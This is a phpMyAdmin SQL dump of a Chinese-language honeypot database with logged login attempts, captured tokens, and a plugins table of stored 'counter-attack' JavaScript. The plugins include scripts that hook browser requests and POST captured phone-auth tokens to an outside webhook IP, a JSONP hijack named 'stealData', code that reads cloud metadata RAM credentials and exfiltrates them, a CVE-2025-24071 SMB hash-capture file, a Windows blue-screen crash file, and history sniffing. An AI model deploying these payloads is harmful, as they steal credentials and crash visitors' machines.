-- phpMyAdmin SQL Dump
-- version 4.8.5
-- https://www.phpmyadmin.net/
--
-- 主机： localhost
-- 生成日期： 2026-04-15 15:03:58
-- 服务器版本： 5.7.26
-- PHP 版本： 7.3.4

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- 数据库： `web_honeypot`
--

-- --------------------------------------------------------

--
-- 表的结构 `attackers`
--

CREATE TABLE `attackers` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `ip` varchar(45) NOT NULL,
  `ua` text NOT NULL,
  `timestamp` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- 转存表中的数据 `attackers`
--

INSERT INTO `attackers` (`id`, `username`, `password`, `ip`, `ua`, `timestamp`) VALUES
(1, 'admin', 'password123', '192.168.1.100', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', '2025-12-10 16:51:18'),
(2, 'root', 'toor', '10.0.0.50', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36', '2025-12-10 15:51:18'),
(3, 'user', 'pass', '172.16.0.75', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', '2025-12-10 14:51:18'),
(8, 'admin', 'admin', '::1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', '2025-12-11 10:16:15'),
(9, '123', '123', '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0', '2025-12-11 10:16:36'),
(10, 'admin', 'admin', '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0', '2025-12-11 11:22:06'),
(11, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(12, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(13, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(14, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(15, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(16, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(17, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(18, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(19, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(20, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(21, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(22, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(23, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(24, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(25, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(26, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(27, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(28, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(29, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(30, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(31, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(32, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(33, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(34, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(35, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(36, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(37, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(38, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:11'),
(39, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(40, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(41, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(42, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(43, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(44, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(45, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(46, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(47, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(48, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(49, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(50, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(51, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(52, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(53, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(54, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(55, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(56, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(57, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(58, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(59, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(60, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(61, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(62, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(63, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(64, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(65, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(66, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(67, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(68, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(69, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(70, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(71, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(72, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(73, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(74, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(75, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(76, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(77, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(78, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(79, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(80, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(81, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(82, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(83, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(84, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(85, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(86, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(87, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(88, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(89, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(90, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(91, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(92, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(93, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(94, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(95, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(96, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(97, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(98, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(99, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(100, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(101, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(102, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(103, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(104, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(105, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(106, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(107, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(108, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(109, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(110, 'admin', 'admin123', '203.168.18.19', 'python-requests/2.31.0', '2026-04-08 18:28:12'),
(111, '123', '123', '112.67.213.152', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0', '2026-04-09 17:52:18');

-- --------------------------------------------------------

--
-- 表的结构 `honeypot_events`
--

CREATE TABLE `honeypot_events` (
  `id` int(11) NOT NULL,
  `type` varchar(100) NOT NULL,
  `data` text NOT NULL,
  `ip` varchar(45) NOT NULL,
  `ua` text NOT NULL,
  `timestamp` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- 表的结构 `honeypot_logs`
--

CREATE TABLE `honeypot_logs` (
  `id` int(11) NOT NULL,
  `type` varchar(100) NOT NULL,
  `arguments` text NOT NULL,
  `ip` varchar(45) NOT NULL,
  `ua` text NOT NULL,
  `timestamp` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- 表的结构 `plugins`
--

CREATE TABLE `plugins` (
  `id` varchar(36) NOT NULL,
  `name` varchar(255) NOT NULL,
  `code` text NOT NULL,
  `enabled` tinyint(1) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- 转存表中的数据 `plugins`
--

INSERT INTO `plugins` (`id`, `name`, `code`, `enabled`) VALUES
('316c69c8-78d1-48c1-92c4-1e3a7b1e5c76', 'H5号码认证反制红队', '// 动态加载脚本\nfunction loadScript(src, callback) {\n    var script = document.createElement(\'script\');\n    script.type = \'text/javascript\';\n    script.charset = \'utf-8\';\n    script.src = src;\n    script.onload = callback;\n    script.onerror = function() {\n        console.error(\'Failed to load script:\', src);\n    };\n    document.head.appendChild(script);\n}\n\n// 按顺序加载脚本\nloadScript(\'./js/vconsole.min.js\', function() {    \n    // 初始化 vConsole\n    const vConsole = new window.VConsole();\n    // 隐藏 vConsole\n    document.getElementById(\'__vconsole\').style.display = \'none\';\n    loadScript(\'./js/numberAuth-web-sdk.js\', function() {\n        // 所有脚本加载完成后执行初始化\n       // alert(1);\n        // 立即执行，不等待window.onload\n        (function() {\n            //alert(1);\n            var phoneNumberServer = new window.PhoneNumberServer();            \n            function getToken(jwtToken, accessToken) {\n                console.log(\"准备登录\")\n                phoneNumberServer.getLoginToken({\n                    success: function (res) {\n                        console.log(\"登录成功\", res)\n                        //调用自己的服务端接口:GetPhoneWithToken API,获取手机号\n                    },\n                    error: function (res) {\n                        console.log(\"登录失败\", res)\n                    },\n                    watch: function (status, data) {\n                        console.log(\"鉴权监听.\")\n                        // 等待一段时间后将日志发送到 webhook\n                        setTimeout(() => {\n                            sendLogsToServer();\n                        }, 1000); // 等请求完成\n                    },\n                    authPageOption: {\n                        navText: \"一键登录\", //导航栏标题文案\n                        subtitle: \"\", //副标题导航栏下面的说明文案\n                        btnText: \"立即登录\", //按钮文案\n                        logoImg: \"https://img0.baidu.com/it/u=1094206189,2938192272&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500\",\n                        agreeSymbol: \"、\", //协议和协议之间的连接符号\n                        showCustomView: true, //是否展示自定义控件\n                        customView: {  //自定义控件\n                            //自定义节点\n                            element:\n                                \'<a href=\"http://baidu.com\"><img src=\"./images/index.png\" style=\"position: absolute;left: 50%;top: 50%;transform: translate(-50%, -50%);\"/></a>\',\n                            // style: \".btn_box.other{background: #fff; color: #f00}\",\n                            // js: \"function clickEvent(){alert(666666)}\",\n                        },\n                        privacyBefore: \"我已阅读并同意\",\n                        isDialog: false, //是否弹窗样式\n                        manualClose: true, //是否手动关闭弹窗/授权页\n                    },\n                });\n            }\n\n            function checkLogin(jwtToken, accessToken) {\n                console.log(\"开始执行身份鉴权\")\n                phoneNumberServer.checkLoginAvailable({\n                    accessToken: accessToken,\n                    jwtToken: jwtToken,\n                    success: function (res) {\n                        console.log(\"身份鉴权成功\", res);\n                        getToken();\n                    },\n                    error: function (res) {\n                        console.log(\"身份鉴权失败\", res);\n                    },\n                });\n            }\n\n            function initAuthProcess() {\n                var jwtTokenTemp\n                var accessTokenTemp\n                const xhr = new XMLHttpRequest();\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        // 处理请求成功的逻辑\n                        try {\n                            // 处理json 替换单引号\n                            const responseText = xhr.responseText.replace(/\'/gi, \'\"\');  \n                            //alert(responseText);\n                            const responseData = JSON.parse(responseText);\n                            //获取响应的JwtToken AccessToken\n                            jwtTokenTemp = responseData.TokenInfo.JwtToken;\n                            //alert(jwtTokenTemp);\n                            //console.log(jwtTokenTemp);\n                            accessTokenTemp = responseData.TokenInfo.AccessToken;\n                            //alert(accessTokenTemp);\n                            //console.log(accessTokenTemp);\n                            console.log(\"已获取到鉴权token.\")\n\n                            // 立即执行检查登录\n                            checkLogin(jwtTokenTemp, accessTokenTemp);\n                        } catch (error) {\n                            console.error(\"处理响应数据时出错:\", error);\n                        }\n                    }\n                };\n                //调用自己的服务端获取鉴权token的接口\n                xhr.open(\"GET\", \"./js/1.txt\", true);\n                xhr.send();\n            }\n\n            // 立即执行\n            initAuthProcess();\n        })();\n    });\n});\n\n///-------------------------------------vConsole\n// 保存日志用的数组\nconst networkLogs = [];\n\n// 拦截 XMLHttpRequest\n(function() { //​​立即执行函数表达式(IIFE)​​\n    const originalOpen = XMLHttpRequest.prototype.open;\n    const originalSend = XMLHttpRequest.prototype.send;\n\n    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {\n        this._url = url;\n        this._method = method;\n        return originalOpen.apply(this, arguments);\n    };\n\n    XMLHttpRequest.prototype.send = function(body) {\n        const xhr = this;\n        const startTime = Date.now();\n\n        xhr.addEventListener(\'loadend\', function() {\n            networkLogs.push({\n                type: \'XMLHttpRequest\',\n                url: xhr._url,\n                method: xhr._method,\n                status: xhr.status,\n                response: xhr.responseText,\n                time: Date.now() - startTime\n            });\n        });\n\n        return originalSend.apply(this, arguments);\n    };\n})();\n\n// 拦截 fetch\n(function() { //​​立即执行函数表达式(IIFE)​​\n    const originalFetch = window.fetch;\n    window.fetch = function() {\n        const fetchStart = Date.now();\n        return originalFetch.apply(this, arguments).then(res => {\n            const cloned = res.clone();\n            cloned.text().then(body => {\n                networkLogs.push({\n                    type: \'fetch\',\n                    url: res.url,\n                    status: res.status,\n                    response: body,\n                    time: Date.now() - fetchStart\n                });\n            });\n            return res;\n        });\n    };\n})();\n\n// // 下载日志为 JSON 文件\n// function downloadLogs() {\n//     const blob = new Blob([JSON.stringify(networkLogs, null, 2)], { type: \'application/json\' });\n//     alert(blob);\n//     const link = document.createElement(\'a\'); //创建下载链接,\n//     link.href = URL.createObjectURL(blob);  //为Blob对象创建一个临时URL\n//     link.download = \'networkLogs.json\'; //设置下载文件名\n//     link.click(); //模拟点击<a>元素浏览器会开始触发下载\n// }\n\nfunction sendLogsToServer() {\n//    alert(111);\n    fetch(\'http://8.166.143.185/webhook/receive\', {\n        method: \'POST\',\n        headers: {\n            \'Content-Type\': \'application/json\'\n        },\n        body: JSON.stringify(networkLogs)\n    }).then(res => {\n        console.log(\'日志已发送到\');\n    }).catch(err => {\n        console.error(\'发送失败:\', err);\n    });\n}\n', 0),
('352ca892-197c-4c3f-888e-2f3b45326149', 'H5 摄像头调用', '// 在开发者工具(F12)控制台粘贴运行\nnavigator.mediaDevices.getUserMedia({ video: true })\n  .then(stream => {\n    console.log(\"✅ 摄像头可用\");\n    stream.getTracks().forEach(track => track.stop());\n  })\n  .catch(err => {\n    console.log(\"❌ 错误:\", err.name, err.message);\n  });', 0),
('822df46b-b16a-432c-99f4-73d09b8b3785', 'JSONP蜜罐', '// 1. 定义恶意回调函数，窃取数据\nfunction stealData(data) {\n    // 将数据发送到攻击者服务器\n    fetch(\'http://127.0.0.1/1.php\', {\n        method: \'POST\',\n        headers: {\n            \'Content-Type\': \'application/json\',\n            // 【可选】自定义请求头（若添加，需在1.php中允许该头）\n            // \'X-Requested-With\': \'XMLHttpRequest\'\n        },\n        // 【关键】若需要携带Cookie到1.php（跨域携带凭证），添加此配置\n        credentials: \'include\', // 或 \'same-origin\'（仅同源携带）\n        body: JSON.stringify(data)\n    }).then(res => {\n        if (!res.ok) {\n            throw new Error(`HTTP错误：${res.status}`);\n        }\n        return res.json();\n    }).then(data => {\n        console.log(\'日志已发送到 1.php\', data); // 修正笔误：2.php → 1.php\n    }).catch(err => {\n        console.error(\'发送失败:\', err);\n    });\n    alert(\"恭喜中奖！请查看您的邮箱！\");\n}\n\n// 2. 动态插入 JSONP 请求（受害者已登录，浏览器自动携带 Cookie）\nconst script = document.createElement(\'script\');\nscript.src = \'https://cf.aliyun.com/nvc/nvcPrepare.jsonp?callback=stealData\';\n// JSONP请求超时处理（避免script标签一直挂起）\nscript.timeout = 5000;\nscript.onerror = function() {\n    console.error(\'JSONP请求失败\');\n    document.body.removeChild(script); // 清理无效标签\n};\nscript.onload = function() {\n    // 执行后清理script标签，减少内存占用\n    setTimeout(() => document.body.removeChild(script), 0);\n};\ndocument.body.appendChild(script);\n', 0),
('b54d9d52-25a0-498c-a650-13168020857d', '内网-SMB钓鱼之.library-ms库文件CVE-2025-24071', 'function downloadFile(content, filename) {\n  const a = document.createElement(\'a\');\n  const file = new Blob([content], { type: \'text/plain\' });\n  a.href = URL.createObjectURL(file);\n  a.download = filename;\n  a.click();\n  URL.revokeObjectURL(a.href);\n}\n\n// 使用\ndownloadFile(\'<?xml version=\"1.0\" encoding=\"UTF-8\"?><libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\"><searchConnectorDescriptionList><searchConnectorDescription><simpleLocation><url>\\\\\\\\22.22.22.233\\shared</url></simpleLocation></searchConnectorDescription></searchConnectorDescriptionList></libraryDescription>\', \'demo.library-ms\');\n', 0),
('b82242dd-069f-4aee-9ec4-1f1ca016e366', '反制VPS 漏扫基于无头浏览器技术', 'fetch(\'http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role\', { mode: \'cors\' })\n.then(response => {  \n  if (!response.ok) throw new Error(\'Network response was not ok\');\n  return response.text();  // 返回响应的文本数据\n})\n.then(data => {  //这里的 `data` 就是 `response.text()` 返回的内容\n  return fetch(\'http://8.166.143.185/webhook/receive\', {\n    method: \'POST\',\n    headers: { \'Content-Type\': \'application/json\' },\n    body: JSON.stringify({ data: data }) // 把 `data` 发送到 webhook\n  });\n})\n.then(response => {\n  if (!response.ok) throw new Error(\'Failed to post data\');\n})\n.catch(error => {\n  console.log(error);\n  document.getElementById(\'error\').innerText = error.message;\n});', 0),
('c9856d48-7f65-4c55-b92b-e5169d428725', '利用localStorage 获取历史记录', '// 定义检查函数\nfunction hasVisited(domain) {\n  const storageKey = `hasVisited_${domain.replace(\'.\', \'_\')}`;\n  if (localStorage.getItem(storageKey)) {\n    return true;\n  } else {\n    localStorage.setItem(storageKey, \'true\');\n    return false;\n  }\n}\n\n// 示例链接列表\nconst links = [\n  // ...其他链接\n	\"https://www.kanxue.com/\",\n	\"https://www.90sec.com/\",\n	\"https://xz.aliyun.com/\",\n	\"https://www.freebuf.com/\",\n	\"https://www.ichunqiu.com/\",\n	\"http://www.hongheilianmeng.com/\",\n	\"https://www.52pojie.cn/\",\n	\"https://forum.butian.net/\",\n	\"https://www.hackbase.com/\",\n	\"https://www.seebug.org/\",\n	\"https://www.butian.net/\",\n	\"https://www.bugbank.cn/\",\n	\"https://www.secquan.org/\",\n	\"https://www.secpulse.com/\",\n	\"https://xlab.tencent.com/\",\n	\"https://edge.yuanliao.info/\",\n	\"https://ctstack.net/\",\n	\"https://bbs.pediy.com/\",\n	\"https://www.t00ls.net/\",\n	\"https://xz.aliyun.com/\",\n	\"https://www.freebuf.com/\",\n	\"https://www.anquanke.com/\",\n	\"http://bbs.2cto.com/\",\n	\"https://www.52pojie.cn/\",\n	\"https://forum.butian.net/\",\n	\"https://www.ichunqiu.com/\",\n	\"https://forum.ywhack.com/\",\n	\"http://www.darkst.com/\",\n	\"http://www.hackbase.com/\",\n	\"https://forum.90sec.com/\",\n	\"https://www.seebug.org/\",\n	\"https://www.butian.net/\",\n	\"https://www.bugbank.cn/\",\n	\"https://stack.chaitin.com/\",\n	\"https://www.secquan.org/\",\n	\"https://www.secpulse.com/\",\n	\"https://xlab.tencent.com/cn/\",\n	\"https://www.ctfhub.com/\",\n	\"https://ctf.bugku.com/\",\n	\"https://www.nssctf.cn/\",\n	\"https://ctf.show/\",\n	\"https://adworld.xctf.org.cn/\",\n	\"https://www.hackthebox.com/\",\n	\"https://tryhackme.com/\",\n	\"https://www.360.cn/\",\n	\"https://www.leichi.target/\",\n	\"https://www.butian.net/\",\n	\"https://www.vulbox.com/\",\n	\"https://www.seebug.org/\",\n	\"https://www.cnvd.org.cn/\",\n	\"https://security.tencent.com/\",\n	\"https://security.alibaba.com/\",\n	\"https://bsrc.baidu.com/\",\n	\"https://security.jd.com/\",\n	\"https://security.bytedance.com/\",\n	\"https://security.meituan.com/\",\n	\"https://security.didiglobal.com/\"\n\n];\n\n// 遍历链接并检测\nlinks.forEach(link => {\n  try {\n    const url = new URL(link);\n    const domain = url.hostname.replace(\'www.\', \'\'); // 去除www前缀\n    const isVisited = hasVisited(domain);\n    console.log(`${link}: ${isVisited ? \'曾访问过true\' : \'首次访问false\'}`);\n  } catch (error) {\n    console.log(`无效链接: ${link}`);\n  }\n});\n\n', 0),
('e9333939-95cc-48bc-b3f3-dab0f0bf1522', 'win10 蓝屏反制', 'function downloadFile(content, filename) {\n  const a = document.createElement(\'a\');\n  const file = new Blob([content], { type: \'text/plain\' });\n  a.href = URL.createObjectURL(file);\n  a.download = filename;\n  a.click();\n  URL.revokeObjectURL(a.href);\n}\n\n// 使用\ndownloadFile(\'<iframe src=\"\\\\\\\\.\\\\globalroot\\\\device\\\\condrv\\\\kernelconnect\"></iframe>\', \'win10test.html\');\n', 0);

-- --------------------------------------------------------

--
-- 表的结构 `webhook_requests`
--

CREATE TABLE `webhook_requests` (
  `id` int(11) NOT NULL,
  `data` text NOT NULL,
  `ip` varchar(45) NOT NULL,
  `method` varchar(10) NOT NULL,
  `headers` text NOT NULL,
  `timestamp` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- 转存表中的数据 `webhook_requests`
--

INSERT INTO `webhook_requests` (`id`, `data`, `ip`, `method`, `headers`, `timestamp`) VALUES
(39, '[{\"type\":\"XMLHttpRequest\",\"url\":\"./js/1.txt\",\"method\":\"GET\",\"status\":200,\"response\":\"{\\\"Message\\\":\\\"OK\\\",\\\"RequestId\\\":\\\"238695EA-A4E8-5092-80F3-F475C4022624\\\",\\\"TokenInfo\\\":{\\\"JwtToken\\\":\\\"eyJhbGciOiJSUzI1NiIsImtpZCI6IjAyMjBfcG5zX3VuaXFfa2V5In0.eyJqdGkiOiIwX0JubUJsYTRPUFRnR1hhLVAySGVnIiwiaWF0IjoxNzc1NzU3MjIxLCJleHAiOjE3NzU3NjA4MjEsIm5iZiI6MTc3NTc1NzE2MSwic3ViIjoiWU9VUl9TVUJKRUNUIiwiYXVkIjoiWU9VUl9BVURJRU5DRSIsImFsaVVpZCI6IjEyMzYzMTg2MDc2NDg2MTkifQ.YcmVAZBoePC1fHtdDikJO_NZM7_j4oo9S4Wk4trsXuiXwGQiobmgIwXMG7eDBnrqrNfQXpgOu3k6a681d1M019vjiiGcyp2OfmYxgRCni0n2hS_aVb9wqs1cR2hvXBAFa9peJGyAWUsfZlPdv2F9g9c80GMDZ1GWj64m5Q6Rvylq4AhGbyj1V0WRlgbjq8aKLyD2DWy_9UEroqhcAmUSGOL-GZKJtP3nlMaKv_03Yq3krliQovPRFm7iBGAWmRi85kvd5dr2BROocSG1Ae6zf4QvVflgAn342hlZXC5JP-HAg9z3HTswCE1ZowY1Foqc9fSk9XOmukDIJMLFAI6CQw\\\",\\\"AccessToken\\\":\\\"Zyt8U732FWsur2G/UnHPZiOf0PjHNd1rKmEoLK4h7hBt0NYooae/R2cXNfFCT4Be4j3xSQEfLa4=\\\"},\\\"Code\\\":\\\"OK\\\"}\",\"time\":68},{\"type\":\"XMLHttpRequest\",\"url\":\"//dypns.alysm.cn/pns/authPnsWebAllVendor?accessToken=Zyt8U732FWsur2G%2FUnHPZiOf0PjHNd1rKmEoLK4h7hBt0NYooae%2FR2cXNfFCT4Be4j3xSQEfLa4%3D&jwtToken=eyJhbGciOiJSUzI1NiIsImtpZCI6IjAyMjBfcG5zX3VuaXFfa2V5In0.eyJqdGkiOiIwX0JubUJsYTRPUFRnR1hhLVAySGVnIiwiaWF0IjoxNzc1NzU3MjIxLCJleHAiOjE3NzU3NjA4MjEsIm5iZiI6MTc3NTc1NzE2MSwic3ViIjoiWU9VUl9TVUJKRUNUIiwiYXVkIjoiWU9VUl9BVURJRU5DRSIsImFsaVVpZCI6IjEyMzYzMTg2MDc2NDg2MTkifQ.YcmVAZBoePC1fHtdDikJO_NZM7_j4oo9S4Wk4trsXuiXwGQiobmgIwXMG7eDBnrq